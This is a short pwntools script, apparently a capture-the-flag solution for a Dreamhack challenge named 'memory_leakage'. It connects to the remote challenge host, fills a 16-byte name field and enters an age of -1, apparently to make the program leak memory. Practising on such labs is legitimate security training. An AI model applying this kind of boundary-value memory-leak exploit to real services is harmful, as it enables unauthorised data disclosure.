from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('./memory_leakage', checksec=False)

#r = process(exe.path)
r = remote('host3.dreamhack.games', 22246)
#gdb.attach(r)
r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'Name: ', b'a'*16)
r.sendlineafter(b'Age: ', b'-1')
r.sendlineafter(b'> ', b'2')
r.interactive()
